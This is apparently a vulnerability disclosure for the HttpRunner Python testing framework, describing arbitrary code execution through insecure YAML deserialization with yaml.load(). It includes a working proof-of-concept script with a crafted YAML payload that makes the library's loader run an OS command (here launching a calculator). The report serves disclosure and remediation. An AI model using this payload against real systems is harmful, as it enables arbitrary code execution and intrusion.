# Description

**HttpRunner** is a simple & elegant, yet powerful HTTP(S) testing framework.
This package was vulnerable to Arbitrary code execution via Insecure YAML deserialization due to the use of a known vulnerable function **load()** in **yaml**. <br>

repo: https://github.com/httprunner/httprunner

# Proof of Concept

```python
import os
#os.system('pip3 install httprunner')
from httprunner import loader
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('pwn.yml','w+').write(exploit)
loader._load_yaml_file('pwn.yml')
```

* `pip3 install httprunner`
* `python3 exploit.py`
